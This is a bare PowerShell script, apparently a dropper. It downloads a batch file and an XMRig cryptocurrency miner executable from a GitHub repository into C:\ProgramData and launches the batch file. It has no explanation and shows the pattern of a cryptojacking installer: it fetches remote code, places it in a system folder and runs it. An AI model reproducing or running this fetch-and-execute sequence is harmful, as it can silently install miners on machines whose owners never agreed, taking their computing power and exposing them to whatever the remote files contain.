[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url="https://raw.githubusercontent.com/BinhPhuongIT/xmrig-customs/main/start.cmd"
Invoke-WebRequest -Uri $url -OutFile "C:\ProgramData\start.cmd"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url="https://raw.githubusercontent.com/BinhPhuongIT/xmrig-customs/main/xmrig.exe"
Invoke-WebRequest -Uri $url -OutFile "C:\ProgramData\xmrig.exe"

Start-Process -FilePath "C:\ProgramData\start.cmd" -Wait
